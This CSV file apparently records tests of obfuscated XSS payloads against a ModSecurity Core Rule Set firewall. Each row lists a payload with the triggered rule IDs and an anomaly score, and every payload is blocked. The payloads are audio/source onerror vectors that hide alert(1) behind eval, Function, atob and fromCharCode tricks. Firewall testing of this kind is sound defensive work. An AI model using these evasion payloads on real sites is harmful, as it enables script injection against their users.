index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
7,"<audio src onerror=Function('eva'+'l(String.fromCharCode(97,108,101,114,116,40,49,41))')()>",0,1,block,6,"934100,934100,941100,941120,941160,949110","o37,19v217,91 || o37,19v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760330720.478353
9,"<audio src onerror=Function(['eval','(String.fromCharCode(97,108,101,114,116,40,49,41))'].join(''))()>",0,1,block,5,"934100,941100,941120,941160,949110","o38,19v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603307435.922102
14,"<audio src onerror=Function('return\u0020eval')()(String.fromCharCode(97,108,101,114,116,40,49,41))>",0,1,block,5,"934100,941100,941120,941160,949110","o50,19v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603307884.694573
18,"<audio src onerror=Function(['ev','al(String.fromCharCode(97,108,101,114,116,40,49,41))'].join``)()>",0,1,block,5,"934100,941100,941120,941160,949110","o38,19v217,100 || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603308234.160490
21,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');eval(a);})()""></audio>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o62,5v217,85 || o63,12v217,85 || o25,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603308550.666586
22,"<audio><source onerror=""((function(){var a=String.fromCharCode(97,108,101,114,116,40,49,41);eval(a);})())""></audio>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o91,5v217,115 || o92,13v217,115 || o26,11v217,115 || v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603308678.718289
24,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');window['ev'+'al'](a);})())""></audio>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o70,20v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,100 || o26,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,17v217,100t:urlDecodeUni,t:compressWhitespace || ",35,177603308876.268036
26,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');[]['constructor']['constructor'](a)()})()""></audio>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o63,41v217,114t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,114 || v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,114t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603309058.579691
27,"<audio><source onerror=""((function(){return eval(atob('YWxlcnQoMSk='))})())""></audio>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o44,31v217,85 || o26,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603309171.417690
28,"<audio><source onerror=""(function(){this['e\u0076\u0061l'](atob('YWxlcnQoMSk='))})()""></audio>",0,1,block,6,"934100,941100,941120,941160,941370,949110","o25,11v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,22v217,94t:urlDecodeUni,t:compressWhitespace || ",25,177603309223.662388
29,"<audio><source onerror=""(function(){var a=atob`YWxlcnQoMSk=`;eval(a)})()""></audio>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o60,5v217,82 || o61,11v217,82 || o25,11v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603309332.681344
30,"<audio><source onerror=""((function(){var a=window['at'+'ob']('YWxlcnQoMSk=');eval(a);})())""></audio>",0,1,block,10,"932100,933160,933210,934100,934100,941100,941120,941160,941370,949110","o76,5v217,100 || o77,13v217,100 || o49,41v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,100 || o26,11v217,100t:urlDecodeUni || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,17v217,100t:urlDecodeUni,t:compressWhitespace || ",45,177603309423.953617
31,"<audio><source onerror=""(function(){return Function(atob('YWxlcnQoMSk='))()})()""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603309564.047215
32,"<audio><source onerror=""(function(){var a=atob('YWxlcnQoMSk=');setTimeout(a)})()""></audio>",0,1,block,5,"934100,941100,941120,941160,949110","o25,11v217,90 || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603309520.936219
